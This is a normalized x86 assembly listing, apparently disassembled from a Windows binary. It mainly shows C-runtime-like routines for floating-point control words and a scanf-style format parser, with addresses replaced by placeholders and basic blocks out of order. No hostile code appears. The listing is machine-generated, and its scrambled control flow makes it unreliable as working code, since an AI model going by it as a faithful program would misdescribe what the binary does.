mov al [ ebp + 0x8 ]
test al 0x20
je r-xdata
test al 0x8
je r-xdata
push 0x5
jmp r-xdata
test al 0x4
je r-xdata
xor eax eax
inc eax
pop ebp
retn
pop eax
pop ebp
retn
test al 0x1
je r-xdata
push 0x2
jmp r-xdata
movzx eax al
and eax 0x2
add eax eax
pop ebp
retn
push 0x3
sub_446bbb
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
xor eax eax
mov eax [ eax * 8 + rw-data ]
jmp r-xdata
inc eax
cmp eax 0x1d
jl r-xdata
mov [ ebp - 0x1c ] eax
test eax eax
je r-xdata
mov ecx [ eax * 8 + rw-data ]
cmp ecx [ ebp + 0xc ]
je r-xdata
xor eax eax
push 0xffff
push [ ebp + 0x28 ]
call sub_446db7
push [ ebp + 0x8 ]
call sub_446b5a
fld [ ebp + 0x20 ]
add esp 0xc
leave
retn
mov eax [ ebp + 0x10 ]
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x1c ]
push esi
mov esi [ ebp + 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x24 ]
push 0xffff
push [ ebp + 0x28 ]
mov [ ebp - 0x20 ] esi
mov [ ebp - 0x4 ] eax
call sub_446db7
lea eax [ ebp - 0x20 ]
push eax
call sub_444314
add esp 0xc
test eax eax
jne r-xdata
fld [ ebp - 0x8 ]
pop esi
leave
retn
push esi
call sub_446b5a
pop ecx
sub_446c5b
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
cmp [ rw-data ] 0x0
fld [ ebp + 0xc ]
fadd [ ebp + 0x14 ]
fstp [ ebp - 0x8 ]
jne r-xdata
call sub_43c04c
push 0xffff
push [ ebp + 0x1c ]
mov [ eax ] 0x21
call sub_446db7
fld [ ebp - 0x8 ]
pop ecx
pop ecx
leave
retn
push [ ebp + 0x1c ]
fld [ ebp - 0x8 ]
sub esp 0x18
fstp [ esp + 0x10 ]
fld [ ebp + 0x14 ]
fstp [ esp + 0x8 ]
fld [ ebp + 0xc ]
fstp [ esp ]
push [ ebp + 0x8 ]
push 0x1
call sub_446bbb
add esp 0x24
leave
retn
sub_446cbc
mov edi edi
push ebx
mov ebx esp
push ecx
push ecx
and esp 0xfffffff0
add esp 0x4
push ebp
mov ebp [ ebx + 0x4 ]
mov [ esp + 0x4 ] ebp
mov ebp esp
sub esp 0x80
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push [ ebx + 0x28 ]
lea eax [ ebx + 0x20 ]
push eax
push [ ebx + 0x8 ]
call sub_446976
add esp 0xc
test eax eax
jne r-xdata
push [ ebx + 0x8 ]
call sub_446b87
add esp 0x4
cmp [ rw-data ] 0x0
jne r-xdata
mov eax [ ebp - 0x40 ]
fld [ ebx + 0x18 ]
and eax 0xffffffe3
fstp [ ebp - 0x50 ]
or eax 0x3
mov [ ebp - 0x40 ] eax
push 0x0
lea eax [ ebx + 0x20 ]
push eax
lea eax [ ebx + 0x10 ]
push eax
push [ ebx + 0xc ]
lea eax [ ebx + 0x28 ]
push [ ebx + 0x8 ]
push eax
lea eax [ ebp - 0x80 ]
push eax
call sub_44669a
add esp 0x1c
push eax
call sub_446b5a
mov [ esp ] 0xffff
push [ ebx + 0x28 ]
call sub_446db7
fld [ ebx + 0x20 ]
pop ecx
pop ecx
test eax eax
je r-xdata
push [ ebx + 0x28 ]
fld [ ebx + 0x20 ]
sub esp 0x18
fstp [ esp + 0x10 ]
fld [ ebx + 0x18 ]
fstp [ esp + 0x8 ]
fld [ ebx + 0x10 ]
fstp [ esp ]
push [ ebx + 0xc ]
push eax
call sub_446bbb
add esp 0x24
jmp r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
mov esp ebx
pop ebx
retn
sub_446db7
mov edi edi
push ebp
mov ebp esp
push ecx
fwait
fnstcw [ ebp - 0x4 ]
mov eax [ ebp + 0xc ]
mov ecx [ ebp + 0x8 ]
and ecx [ ebp + 0xc ]
not eax
and ax [ ebp - 0x4 ]
or ax cx
movzx eax ax
mov [ ebp + 0xc ] eax
fldcw [ ebp + 0xc ]
movsx eax [ ebp - 0x4 ]
leave
retn
sub_446de2
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov cl [ ebp + 0x8 ]
test cl 0x1
je r-xdata
test cl 0x8
je r-xdata
fld [ rw-data ]
fistp [ ebp + 0x8 ]
fwait
test cl 0x10
je r-xdata
fwait
fnstsw ax
fld [ rw-data ]
fstp [ ebp - 0x8 ]
fwait
fwait
fnstsw ax
test cl 0x4
je r-xdata
fld [ rw-data ]
fstp [ ebp - 0x8 ]
fwait
test cl 0x20
je r-xdata
fldz
fld1
fdivrp st1
fstp st0
fwait
leave
retn
fldpi
fstp [ ebp - 0x8 ]
fwait
sub_446e3a
push 0x8
push r--data
call sub_43f8e0
xor eax eax
cmp [ rw-data ] eax
je r-xdata
call sub_43f925
retn
test [ ebp + 0x8 ] 0x40
je r-xdata
and [ ebp + 0x8 ] 0xffffffbf
ldmxcsr [ ebp + 0x8 ]
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x4 ] eax
ldmxcsr [ ebp + 0x8 ]
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
jmp r-xdata
sub_446eac
mov edi edi
push ebp
mov ebp esp
mov eax [ esi ]
cmp [ ebp + 0x8 ] eax
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
mov ecx [ edi ]
push 0x2
push eax
cmp ecx [ ebp + 0xc ]
jne r-xdata
push ecx
call sub_43deb1
add esp 0xc
test eax eax
je r-xdata
call sub_43de17
pop ecx
pop ecx
mov [ edi ] eax
test eax eax
jne r-xdata
xor eax eax
pop ebp
retn
mov [ edi ] eax
mov eax [ ebp + 0x10 ]
mov [ eax ] 0x1
push [ esi ]
push [ ebp + 0xc ]
push [ edi ]
call sub_43a8a0
add esp 0xc
jmp r-xdata
shl [ esi ] 0x1
sub_446f03
mov edi edi
push ebp
mov ebp esp
movzx eax [ ebp + 0x8 ]
push eax
call sub_43af14
test eax eax
movsx eax [ ebp + 0x8 ]
pop ecx
jne r-xdata
pop ebp
retn
and eax 0xffffffdf
sub eax 0x7
sub_446f39
mov edi edi
push ebp
mov ebp esp
push ebx
mov eax ebx
pop ebx
pop ebp
retn
movzx eax bl
push eax
call sub_43b019
pop ecx
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
inc [ esi ]
call sub_446f23
mov ebx eax
cmp ebx 0xffffffff
je r-xdata
sub_446f63
mov edi edi
push ebp
mov ebp esp
sub esp 0x204
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov ecx [ ebp + 0x14 ]
mov eax [ ebp + 0x8 ]
push esi
mov esi [ ebp + 0xc ]
push edi
xor edi edi
mov [ ebp - 0x1e4 ] ecx
lea ecx [ ebp - 0x184 ]
mov [ ebp - 0x1a0 ] eax
mov [ ebp - 0x1b0 ] esi
mov [ ebp - 0x1a8 ] ecx
mov [ ebp - 0x1d8 ] 0x15e
mov [ ebp - 0x1d0 ] edi
mov [ ebp - 0x1f0 ] edi
mov [ ebp - 0x194 ] edi
mov [ ebp - 0x1f4 ] edi
cmp esi edi
jne r-xdata
cmp eax edi
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
or eax 0xffffffff
jmp r-xdata
test [ eax + 0xc ] 0x40
push ebx
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_437c1c
leave
retn
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x204 ]
call sub_438ce6
mov al [ esi ]
mov [ ebp - 0x1a2 ] 0x0
mov [ ebp - 0x18c ] edi
mov [ ebp - 0x1c8 ] edi
test al al
je r-xdata
push eax
call sub_43917d
pop ecx
mov edx rw-data
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0x1f8 ] 0x0
je r-xdata
movzx eax al
push eax
call sub_43b019
pop ecx
test eax eax
je r-xdata
mov ecx edx
cmp eax 0xfffffffe
je r-xdata
mov eax [ ebp - 0x1c8 ]
mov eax [ ebp - 0x1fc ]
and [ eax + 0x70 ] 0xfffffffd
mov esi [ ebp - 0x1b0 ]
mov al [ esi ]
cmp al 0x25
jne r-xdata
push [ ebp - 0x1a0 ]
dec [ ebp - 0x18c ]
lea esi [ ebp - 0x18c ]
call sub_446f39
pop ecx
cmp eax 0xffffffff
je r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
or eax 0xffffffff
jmp r-xdata
cmp eax 0xffffffff
je r-xdata
mov ecx eax
and ecx 0x1f
mov ebx eax
sar ebx 0x5
shl ecx 0x6
add ecx [ ebx * 4 + rw-data ]
jmp r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_446f23
mov ebx eax
movzx eax [ esi ]
inc esi
mov [ ebp - 0x194 ] ebx
mov [ ebp - 0x1b0 ] esi
cmp eax ebx
jne r-xdata
cmp [ esi + 0x1 ] al
je r-xdata
mov esi [ ebp - 0x1b0 ]
push [ ebp - 0x1a0 ]
push eax
call sub_43e8a5
pop ecx
pop ecx
pop ebx
mov eax edx
cmp eax 0xfffffffe
je r-xdata
test [ ecx + 0x24 ] 0x7f
jne r-xdata
cmp ebx 0xffffffff
movzx eax bl
push eax
call sub_44b629
pop ecx
test eax eax
je r-xdata
cmp al 0x25
jne r-xdata
xor edi edi
mov [ ebp - 0x1c4 ] edi
mov [ ebp - 0x1d1 ] 0x0
mov [ ebp - 0x1ac ] edi
mov [ ebp - 0x1c0 ] edi
mov [ ebp - 0x19c ] edi
mov [ ebp - 0x1cc ] edi
mov [ ebp - 0x1a3 ] 0x0
mov [ ebp - 0x1a4 ] 0x0
mov [ ebp - 0x196 ] 0x0
mov [ ebp - 0x18d ] 0x0
mov [ ebp - 0x1a1 ] 0x0
mov [ ebp - 0x195 ] 0x0
mov [ ebp - 0x185 ] 0x1
mov [ ebp - 0x1dc ] edi
inc esi
movzx eax [ esi ]
push eax
call sub_43b019
pop ecx
test eax eax
jne r-xdata
mov [ ebp - 0x1b0 ] esi
jmp r-xdata
mov ecx eax
and eax 0x1f
sar ecx 0x5
shl eax 0x6
add eax [ ecx * 4 + rw-data ]
jmp r-xdata
cmp [ ebp - 0x1d0 ] 0x1
jne r-xdata
push [ ebp - 0x1a0 ]
push [ ebp - 0x194 ]
call sub_43e8a5
pop ecx
pop ecx
cmp [ ebp - 0x194 ] 0xffffffff
jne r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_446f23
movzx ecx [ esi ]
inc esi
mov [ ebp - 0x1b0 ] esi
cmp ecx eax
jne r-xdata
cmp [ esi + 0x1 ] al
jne r-xdata
cmp ebx 0x4e
jg r-xdata
mov eax [ ebp - 0x19c ]
inc [ ebp - 0x1c0 ]
imul eax eax 0xa
lea eax [ eax + ebx - 0x30 ]
mov [ ebp - 0x19c ] eax
jmp r-xdata
mov al [ esi ]
test al al
jne r-xdata
test [ eax + 0x24 ] 0x80
je r-xdata
cmp [ ebp - 0x194 ] 0xffffffff
jne r-xdata
push [ ebp - 0x1a8 ]
call sub_4381f8
pop ecx
cmp [ esi ] 0x25
jne r-xdata
cmp eax 0xffffffff
je r-xdata
dec [ ebp - 0x18c ]
inc esi
cmp ebx 0x68
je r-xdata
je r-xdata
cmp [ ebp - 0x18d ] 0x0
je r-xdata
jmp r-xdata
cmp [ ebp - 0x1f4 ] 0x1
jne r-xdata
mov eax [ ebp - 0x1c8 ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x1b0 ]
cmp [ eax + 0x1 ] 0x6e
jne r-xdata
push [ ebp - 0x1a0 ]
push eax
call sub_43e8a5
pop ecx
pop ecx
dec [ ebp - 0x185 ]
dec [ ebp - 0x195 ]
cmp ebx 0x6c
je r-xdata
cmp ebx 0x2a
je r-xdata
inc esi
movzx ebx [ esi ]
movzx eax bl
push eax
call sub_43af14
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x196 ] 0x0
mov [ ebp - 0x1b0 ] esi
jne r-xdata
call sub_43c04c
mov [ eax ] 0x16
call sub_43f8c5
cmp [ ebp - 0x1f8 ] 0x0
je r-xdata
cmp [ ebp - 0x1a2 ] al
jne r-xdata
mov esi eax
lea eax [ esi + 0x1 ]
cmp [ eax ] 0x6c
je r-xdata
cmp ebx 0x77
je r-xdata
inc [ ebp - 0x196 ]
jmp r-xdata
cmp ebx 0x46
je r-xdata
xor ebx ebx
mov eax [ ebp - 0x1e4 ]
mov ebx [ eax ]
mov [ ebp - 0x1ec ] eax
add eax 0x4
mov [ ebp - 0x1e4 ] eax
jmp r-xdata
mov ecx [ ebp - 0x1fc ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
or eax 0xffffffff
inc [ ebp - 0x1dc ]
mov esi eax
mov [ ebp - 0x1b8 ] edi
mov [ ebp - 0x1b4 ] edi
jmp r-xdata
inc [ ebp - 0x185 ]
inc [ ebp - 0x195 ]
jmp r-xdata
inc [ ebp - 0x18d ]
jmp r-xdata
cmp ebx 0x49
je r-xdata
movzx edi [ esi ]
or edi 0x20
mov [ ebp - 0x1e8 ] edi
cmp edi 0x6e
je r-xdata
mov al [ esi ]
cmp al 0x53
je r-xdata
cmp [ ebp - 0x195 ] 0x0
mov [ ebp - 0x1bc ] ebx
mov [ ebp - 0x18d ] 0x0
jne r-xdata
mov cl [ esi + 0x1 ]
cmp cl 0x36
jne r-xdata
cmp ebx 0x4c
jne r-xdata
mov ecx [ ebp - 0x1c0 ]
test ecx ecx
je r-xdata
cmp edi 0x63
je r-xdata
mov [ ebp - 0x195 ] 0x1
mov [ ebp - 0x195 ] 0xff
cmp al 0x43
jne r-xdata
cmp cl 0x33
jne r-xdata
lea eax [ esi + 0x2 ]
cmp [ eax ] 0x34
jne r-xdata
inc [ ebp - 0x185 ]
jmp r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
cmp [ ebp - 0x19c ] 0x0
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_446f23
cmp edi 0x7b
je r-xdata
cmp cl 0x64
je r-xdata
lea eax [ esi + 0x2 ]
cmp [ eax ] 0x32
jne r-xdata
cmp edi 0x6f
jg r-xdata
cmp edi 0x63
je r-xdata
cmp [ ebp - 0x194 ] 0xffffffff
jmp r-xdata
mov ebx [ ebp - 0x1bc ]
mov esi [ ebp - 0x1b0 ]
mov edi [ ebp - 0x1e8 ]
push [ ebp - 0x1a0 ]
lea esi [ ebp - 0x18c ]
call sub_446f39
pop ecx
jmp r-xdata
cmp cl 0x69
je r-xdata
mov esi eax
jmp r-xdata
mov eax edi
sub eax 0x70
je r-xdata
je r-xdata
mov eax [ ebp - 0x1ec ]
mov ebx [ eax ]
add eax 0x4
mov [ ebp - 0x1ec ] eax
add eax 0x4
mov [ ebp - 0x1e4 ] eax
mov eax [ eax - 0x4 ]
mov [ ebp - 0x1bc ] ebx
mov [ ebp - 0x1cc ] eax
cmp eax 0x1
jb r-xdata
cmp edi 0x73
je r-xdata
je r-xdata
mov [ ebp - 0x194 ] eax
cmp eax 0xffffffff
je r-xdata
cmp cl 0x6f
je r-xdata
mov [ ebp - 0x185 ] 0x1
sub eax 0x3
je r-xdata
mov ebx [ ebp - 0x194 ]
cmp ebx 0x2d
jne r-xdata
cmp edi 0x63
je r-xdata
cmp [ ebp - 0x195 ] 0x0
jle r-xdata
cmp edi 0x7b
jne r-xdata
cmp cl 0x78
je r-xdata
cmp ebx 0x2b
jne r-xdata
mov [ ebp - 0x1a4 ] 0x1
jmp r-xdata
cmp [ ebp - 0x195 ] 0x0
jle r-xdata
dec eax
dec eax
je r-xdata
test ecx ecx
jne r-xdata
cmp edi 0x64
je r-xdata
mov [ ebx ] 0x0
xor eax eax
mov [ ebx ] ax
jmp r-xdata
cmp cl 0x58
jne r-xdata
cmp [ ebp - 0x1dc ] 0x0
je r-xdata
dec [ ebp - 0x19c ]
jne r-xdata
dec [ ebp - 0x18c ]
cmp [ ebp - 0x194 ] 0xffffffff
mov esi ebx
je r-xdata
mov [ ebp - 0x1a1 ] 0x1
sub eax 0x3
je r-xdata
inc [ ebp - 0x19c ]
mov [ ebp - 0x1c0 ] 0x1
jle r-xdata
call sub_43c04c
mov [ eax ] 0xc
jmp r-xdata
jmp r-xdata
cmp [ ebp - 0x18d ] 0x0
jne r-xdata
cmp [ ebp - 0x18d ] 0x0
jne r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_446f23
mov ebx eax
test ecx ecx
je r-xdata
cmp edi 0x63
je r-xdata
push [ ebp - 0x1a0 ]
push [ ebp - 0x194 ]
call sub_43e8a5
pop ecx
pop ecx
mov ebx [ ebp - 0x194 ]
cmp ebx 0x2d
jne r-xdata
sub eax 0x3
je r-xdata
movzx eax [ esi ]
cmp eax [ ebp - 0x194 ]
jne r-xdata
cmp edi 0x67
jle r-xdata
cmp [ ebp - 0x1a4 ] 0x0
je r-xdata
cmp edi 0x78
je r-xdata
cmp [ ebp - 0x1a4 ] 0x0
je r-xdata
cmp edi 0x78
je r-xdata
mov [ ebp - 0x18d ] 0x1
jmp r-xdata
cmp [ ebp - 0x1c0 ] 0x0
je r-xdata
dec [ ebp - 0x1cc ]
cmp ebx 0x2b
jne r-xdata
mov [ ebp - 0x1a4 ] 0x1
jmp r-xdata
cmp [ ebp - 0x195 ] 0x0
jle r-xdata
cmp [ ebp - 0x194 ] 0xffffffff
je r-xdata
dec [ ebp - 0x1a2 ]
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp - 0x194 ] 0x2d
jne r-xdata
cmp edi 0x69
je r-xdata
cmp edi 0x46
jne r-xdata
neg [ ebp - 0x1c4 ]
movzx eax bl
push eax
call sub_43af98
pop ecx
test eax eax
je r-xdata
cmp edi 0x70
je r-xdata
mov eax [ ebp - 0x1b8 ]
mov ecx [ ebp - 0x1b4 ]
neg eax
adc ecx 0x0
neg ecx
mov [ ebp - 0x1b8 ] eax
mov [ ebp - 0x1b4 ] ecx
jmp r-xdata
movzx eax bl
push eax
call sub_43af98
pop ecx
test eax eax
je r-xdata
cmp edi 0x70
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_446f23
mov [ ebp - 0x194 ] eax
cmp eax 0xffffffff
je r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
cmp ebx 0x30
jne r-xdata
dec [ ebp - 0x19c ]
jne r-xdata
inc esi
cmp [ esi ] 0x5e
jne r-xdata
mov [ ebp - 0x1a1 ] 0x1
mov [ ebp - 0x1f4 ] 0x1
jmp r-xdata
push [ ebp - 0x1a0 ]
push [ ebp - 0x194 ]
call sub_43e8a5
pop ecx
pop ecx
mov esi [ ebp - 0x1b0 ]
inc [ ebp - 0x1a2 ]
inc esi
mov [ ebp - 0x1b0 ] esi
jmp r-xdata
mov eax [ ebp - 0x1ec ]
mov [ ebp - 0x1e4 ] eax
jmp r-xdata
cmp [ ebp - 0x194 ] 0x2b
jne r-xdata
mov eax [ ebp - 0x1a8 ]
mov [ eax ] 0x2d
inc ebx
jmp r-xdata
push 0x64
pop edi
cmp edi 0x6e
jne r-xdata
cmp [ ebp - 0x1ac ] 0x0
je r-xdata
and [ ebp - 0x1ac ] 0x0
dec [ ebp - 0x18c ]
cmp ebx 0xffffffff
je r-xdata
shl [ ebp - 0x1c4 ] 0x4
push ebx
call sub_446f03
mov ebx eax
mov eax [ ebp - 0x1c4 ]
pop ecx
mov [ ebp - 0x194 ] ebx
movzx eax bl
push eax
call sub_43af14
pop ecx
test eax eax
je r-xdata
dec [ ebp - 0x18c ]
cmp ebx 0xffffffff
je r-xdata
mov eax [ ebp - 0x1b8 ]
mov ecx [ ebp - 0x1b4 ]
shld ecx eax 0x4
shl eax 0x4
push ebx
mov [ ebp - 0x1b8 ] eax
mov [ ebp - 0x1b4 ] ecx
call sub_446f03
mov ebx eax
pop ecx
mov [ ebp - 0x194 ] ebx
movzx eax bl
push eax
call sub_43af14
pop ecx
test eax eax
je r-xdata
dec [ ebp - 0x18c ]
cmp eax 0xffffffff
je r-xdata
cmp edi 0x63
je r-xdata
cmp esi ebx
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_446f23
mov ebx eax
mov [ ebp - 0x194 ] ebx
cmp bl 0x78
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_446f23
mov ebx eax
mov [ ebp - 0x194 ] ebx
test ecx ecx
je r-xdata
push 0x20
lea eax [ ebp - 0x24 ]
push 0x0
push eax
call sub_43a820
add esp 0xc
cmp [ esi ] 0x5d
jne r-xdata
inc esi
mov [ ebp - 0x1a3 ] 0xff
cmp [ ebp - 0x1c0 ] 0x0
jne r-xdata
dec [ ebp - 0x19c ]
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_446f23
mov [ ebp - 0x194 ] eax
cmp [ ebp - 0x196 ] 0x0
mov eax [ ebp - 0x18c ]
je r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
push [ ebp - 0x1a0 ]
push ebx
call sub_43e8a5
pop ecx
pop ecx
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_446f23
mov ebx eax
mov [ ebp - 0x194 ] ebx
jmp r-xdata
dec [ ebp - 0x19c ]
je r-xdata
cmp edi 0x6f
jne r-xdata
push [ ebp - 0x1a0 ]
push ebx
call sub_43e8a5
pop ecx
pop ecx
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_446f23
mov ebx eax
mov [ ebp - 0x194 ] ebx
jmp r-xdata
dec [ ebp - 0x19c ]
je r-xdata
cmp edi 0x6f
jne r-xdata
push [ ebp - 0x1a0 ]
push eax
call sub_43e8a5
pop ecx
pop ecx
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
cmp edi 0x73
jne r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_446f23
cmp [ ebp - 0x1c0 ] 0x0
mov ebx eax
mov [ ebp - 0x194 ] ebx
je r-xdata
cmp bl 0x58
je r-xdata
mov [ ebp - 0x18d ] 0x1
jmp r-xdata
mov dl [ ebp - 0x1d1 ]
jmp r-xdata
mov dl 0x5d
inc esi
mov [ ebp - 0x19 ] 0x20
jmp r-xdata
movzx eax [ ebp - 0x194 ]
jmp r-xdata
or [ ebp - 0x19c ] 0xffffffff
cmp [ ebp - 0x1dc ] 0x0
je r-xdata
jmp r-xdata
inc [ ebp - 0x1c8 ]
mov ebx [ ebp - 0x1bc ]
mov eax [ ebp - 0x1c4 ]
mov eax [ ebp - 0x1c4 ]
imul eax eax 0xa
jmp r-xdata
cmp ebx 0x38
jge r-xdata
push 0x0
push 0xa
push [ ebp - 0x1b4 ]
push [ ebp - 0x1b8 ]
call sub_43ee50
mov [ ebp - 0x1b8 ] eax
mov [ ebp - 0x1b4 ] edx
jmp r-xdata
cmp ebx 0x38
jge r-xdata
inc esi
jmp r-xdata
cmp [ ebp - 0x1cc ] 0x0
je r-xdata
cmp edi 0x7b
jne r-xdata
cmp eax 0x9
jl r-xdata
inc [ ebp - 0x1c8 ]
cmp [ ebp - 0x1e8 ] 0x63
je r-xdata
push 0x78
sub [ ebp - 0x19c ] 0x2
cmp [ ebp - 0x19c ] 0x1
jge r-xdata
mov [ ebp - 0x1ac ] 0x1
cmp edi 0x78
je r-xdata
mov al [ esi ]
cmp al 0x5d
jne r-xdata
push eax
call sub_43af14
pop ecx
test eax eax
jne r-xdata
cmp [ ebp - 0x185 ] 0x0
je r-xdata
mov eax [ ebp - 0x1b8 ]
mov [ ebx ] eax
mov eax [ ebp - 0x1b4 ]
mov [ ebx + 0x4 ] eax
jmp r-xdata
inc [ ebp - 0x1ac ]
cmp [ ebp - 0x1c0 ] 0x0
lea eax [ eax + ebx - 0x30 ]
mov [ ebp - 0x1c4 ] eax
je r-xdata
mov eax [ ebp - 0x1c4 ]
shl eax 0x3
jmp r-xdata
inc [ ebp - 0x1ac ]
lea eax [ ebx - 0x30 ]
cdq
add [ ebp - 0x1b8 ] eax
adc [ ebp - 0x1b4 ] edx
cmp [ ebp - 0x1c0 ] 0x0
je r-xdata
mov eax [ ebp - 0x1b8 ]
mov ecx [ ebp - 0x1b4 ]
shld ecx eax 0x3
shl eax 0x3
mov [ ebp - 0x1b8 ] eax
mov [ ebp - 0x1b4 ] ecx
jmp r-xdata
call sub_43c04c
cmp [ ebp - 0x1a1 ] 0x0
mov [ eax ] 0xc
je r-xdata
cmp [ ebp - 0x1a1 ] 0x0
je r-xdata
movsx edi [ ebp - 0x1a3 ]
xor edx edx
mov ecx eax
and ecx 0x7
inc edx
shl edx cl
mov ecx eax
sar ecx 0x3
movsx ecx [ ebp + ecx - 0x24 ]
xor ecx edi
test ecx edx
je r-xdata
cmp eax 0x20
jne r-xdata
cmp eax 0xd
jle r-xdata
cmp [ ebp - 0x1a1 ] 0x0
je r-xdata
inc [ ebp - 0x18d ]
dec [ ebp - 0x18c ]
cmp ebx 0xffffffff
je r-xdata
cmp [ ebp - 0x1c0 ] 0x0
je r-xdata
inc esi
cmp al 0x2d
jne r-xdata
test al al
je r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
mov eax [ ebp - 0x204 ]
mov eax [ eax + 0xbc ]
mov eax [ eax ]
mov al [ eax ]
mov [ ebp - 0x1a3 ] al
cmp al [ ebp - 0x194 ]
jne r-xdata
mov [ ebx ] ax
mov [ ebx ] eax
jmp r-xdata
mov [ esi ] 0x0
jmp r-xdata
xor eax eax
mov [ esi ] ax
jmp r-xdata
mov [ ebx ] al
inc ebx
mov [ ebp - 0x1e0 ] al
movzx eax al
push eax
call sub_44b629
pop ecx
test eax eax
je r-xdata
mov edi [ ebp - 0x1e8 ]
mov eax [ ebp - 0x1bc ]
mov [ eax ] 0x0
jmp r-xdata
mov ecx [ ebp - 0x1bc ]
xor eax eax
mov [ ecx ] ax
jmp r-xdata
push 0x30
pop ebx
jmp r-xdata
push [ ebp - 0x1a0 ]
push ebx
call sub_43e8a5
pop ecx
pop ecx
push 0x6f
jmp r-xdata
dec [ ebp - 0x19c ]
jne r-xdata
movzx ecx al
mov dl al
mov eax ecx
and ecx 0x7
mov bl 0x1
shr eax 0x3
shl bl cl
lea eax [ ebp + eax - 0x24 ]
or [ eax ] bl
test dl dl
je r-xdata
mov ebx [ ebp - 0x1bc ]
mov edi [ ebp - 0x1e8 ]
mov [ ebp - 0x1b0 ] esi
jmp r-xdata
mov al [ ebp - 0x194 ]
mov ecx [ ebp - 0x1a8 ]
inc [ ebp - 0x1ac ]
mov [ ebx + ecx ] al
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1a8 ]
lea esi [ ebp - 0x1d8 ]
call sub_446eac
add esp 0xc
test eax eax
je r-xdata
cmp [ ebp - 0x1ac ] 0x0
je r-xdata
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
lea eax [ ebp - 0x204 ]
push eax
mov eax [ ebp - 0x204 ]
mov [ ebp - 0x1f0 ] 0x3f
push [ eax + 0xac ]
lea eax [ ebp - 0x1e0 ]
push eax
lea eax [ ebp - 0x1f0 ]
push eax
call sub_44b4c1
mov ax [ ebp - 0x1f0 ]
add esp 0x10
mov [ ebx ] ax
add ebx 0x2
jmp r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_446f23
mov [ ebp - 0x1df ] al
mov [ ebp - 0x194 ] ebx
pop edi
jmp r-xdata
inc [ ebp - 0x18d ]
mov cl [ esi ]
cmp cl 0x5d
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_446f23
mov [ ebp - 0x194 ] eax
movzx eax al
dec [ ebp - 0x18c ]
cmp [ ebp - 0x194 ] 0xffffffff
je r-xdata
cmp [ ebp - 0x194 ] 0x65
je r-xdata
mov edx [ ebp - 0x1a0 ]
inc [ ebp - 0x18c ]
call sub_446f23
mov ecx [ ebp - 0x1a8 ]
mov [ ebp - 0x194 ] eax
mov al [ ebp - 0x1a3 ]
mov [ ebx + ecx ] al
lea eax [ ebp - 0x1d0 ]
push eax
lea eax [ ebp - 0x184 ]
push eax
inc ebx
push ebx
lea edi [ ebp - 0x1a8 ]
lea esi [ ebp - 0x1d8 ]
call sub_446eac
add esp 0xc
test eax eax
je r-xdata
mov [ ebp - 0x1bc ] ebx
jmp r-xdata
inc esi
cmp dl cl
jae r-xdata
cmp [ ebp - 0x1ac ] 0x0
je r-xdata
push [ ebp - 0x1a0 ]
push [ ebp - 0x194 ]
call sub_43e8a5
pop ecx
pop ecx
mov eax [ ebp - 0x19c ]
dec [ ebp - 0x19c ]
test eax eax
je r-xdata
cmp [ ebp - 0x194 ] 0x45
jne r-xdata
movzx eax [ ebp - 0x194 ]
jmp r-xdata
mov [ ebp - 0x185 ] dl
mov dl cl
mov [ ebp - 0x185 ] cl
jmp r-xdata
cmp [ ebp - 0x196 ] 0x0
jne r-xdata
mov eax [ ebp - 0x1a8 ]
mov [ ebx + eax ] 0x65
lea eax [ ebp - 0x1d0 ]
